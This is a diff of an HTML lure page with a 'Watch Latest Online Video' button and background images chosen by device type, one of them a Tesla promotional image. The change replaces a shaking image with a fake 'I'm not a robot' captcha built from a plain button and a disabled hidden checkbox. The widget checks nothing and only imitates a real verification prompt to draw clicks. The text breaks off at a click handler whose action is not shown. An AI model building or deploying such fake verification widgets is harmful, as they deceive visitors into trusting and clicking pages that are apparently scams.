@@ -75,7 +75,21 @@ html, body
 
 <div class='box-main'> <button class='btn'>Watch Latest Online Video</button> </div> <style> .btn { display: inline-block; border-radius: 0px!important; letter-spacing: 0.5px; border: none; border-bottom: 3px solid #808080; background: #097969; color: white; width: 100%; font: bold 25px/1.3em Helvetica, Arial, sans-serif!important; text-align: center; font-weight: bold; font-size: 23px; padding: 6px 8px; cursor: pointer; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } </style>
 
-<img src="https://iili.io/mgZF3v.png" class="imageOK" style="opacity: 0; animation: shake-animation 2s ease infinite; width: 350px; height: 350px; position: fixed; top: 35%; left: 0; right: 0; margin: auto;">
+
+<div class="cc">
+<div class="box-main">
+<div class="llo">
+<div class="captchaContainer">
+<div class="captchaWrapper">
+<button type="button" class="captchaBox boxHover"></button>
+</div>
+<input type="checkbox" name="hiddenCaptcha" id="hiddenCaptcha" disabled="disabled"/>
+<label for="hiddenCaptcha" class="captchaLabel">I'm not a robot</label>
+</div>
+</div>
+</div>
+</div>
+
 
 <script>
 if(navigator.userAgent.match(/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/)) { document.write('<img src="https://iili.io/mKMhog.gif" class="imageNO" style="object-fit: cover!important; height: 100vh!important; width: 100%!important; background-color: #FFFFFF; pointer-events: none; top: 0; bottom: 0;"/>') } else if (navigator.userAgent.match(/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i)) { document.write('<img src="https://wallpapercave.com/wp/wp6344040.jpg" style="height: 100vh!important; width: 100%!important; background-color: #FFFFFF; pointer-events: none; top: 0; bottom: 0;"/>') } else { document.write('<img src="https://tesla-cdn.thron.com/delivery/public/image/tesla/56cb8c41-e898-44ce-b6b7-fe9b9a05f529/bvlatuR/std/1200x628/MS-Social" style="height: 100vh!important; width: 100%!important; background-color: #FFFFFF; pointer-events: none; top: 0; bottom: 0;"/>') }
@@ -88,7 +102,75 @@ if(navigator.userAgent.match(/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kin
 </div>
 </div>
 
-<script> document.querySelector('.imageNO').onload = function(){ document.querySelector(".imageOK").style.opacity = "1"; }; </script>
+<style>
+.llo { top: auto; left: 0; right: 0; display: flex; justify-content: center; }
+.captchaContainer {
+  border-radius: 3px;
+  border: 1px solid #000000;
+  padding: 10px 20px 10px 20px;
+  background-color: #93C572;
+}
+.captchaWrapper {
+  line-height: 0;
+}
+.captchaWrapper, .captchaContainer {
+  display: inline-block;
+  float: left;
+}
+#hiddenCaptcha {
+  display: none;
+}
+#hiddenCaptcha:checked + .captchaLabel:after {
+  max-width: 25px;
+  opacity: 1;
+  overflow: inherit;
+}
+.captchaLabel {
+  font-family: 'Trebuchet MS', sans-serif;
+  font-weight: 700;
+  padding: 2px 0 0 15px;
+  position: relative;
+  display: block;
+  float: left;
+  font-size: 25px;
+  color: #343434;
+  margin-top: 0;
+}
+.captchaLabel:after {
+  font-family: FontAwesome;
+  position: absolute;
+  content: '\f00c';
+  max-width: 0;
+  overflow: hidden;
+  opacity: 0.5;
+  font-size: 30px;
+  top: 0;
+  left: -24px;
+  color: #039F53;
+  -webkit-transition: all 0.7s;
+  -moz-transition: all 0.7s;
+  -ms-transition: all 0.7s;
+  transition: all 0.7s;
+}
+.captchaBox {
+  width: 30px;
+  height:30px;
+  padding: 0;
+  outline: none;
+  border: 1px solid #000000;
+  border-radius: 3px;
+  margin-top: 4.5px;
+}
+.boxHover {
+  background-color: #fff;
+}
+.boxHover:hover {
+
+}
+@keyframes shake-animation { 0% { transform:translate(0,0) } 1.78571% { transform:translate(5px,0) } 3.57143% { transform:translate(0,0) } 5.35714% { transform:translate(5px,0) } 7.14286% { transform:translate(0,0) } 8.92857% { transform:translate(5px,0) } 10.71429% { transform:translate(0,0) } 100% { transform:translate(0,0) } }
+</style>
+
+<script> document.querySelector('.imageNO').onload = function(){ document.querySelector(".cc").style.opacity = "1"; }; </script>
 
 <script>
 document.querySelector(".imageOK").onclick = function () {
